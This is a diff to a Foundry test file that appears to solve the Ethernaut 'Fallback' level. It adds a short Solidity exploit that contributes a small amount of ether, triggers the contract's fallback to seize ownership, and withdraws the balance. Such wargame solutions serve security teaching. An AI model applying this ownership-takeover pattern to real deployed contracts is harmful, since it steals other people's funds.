@@ -28,7 +28,11 @@ contract FallbackTest is Test {
         /****************
          *    Attack     *
          *************** */
-
+         ethernautFallback.contribute{value: 0.0001 ether}();
+        (bool success, ) = payable((address(ethernautFallback))).call{value: levelAddress.balance}("");
+        require(success, "Fallback failed to send ether");
+        require((ethernautFallback).owner() == player, "Failed to hack fallback");
+        ethernautFallback.withdraw();
         /*****************
          *Level Submission*
          ***************  */
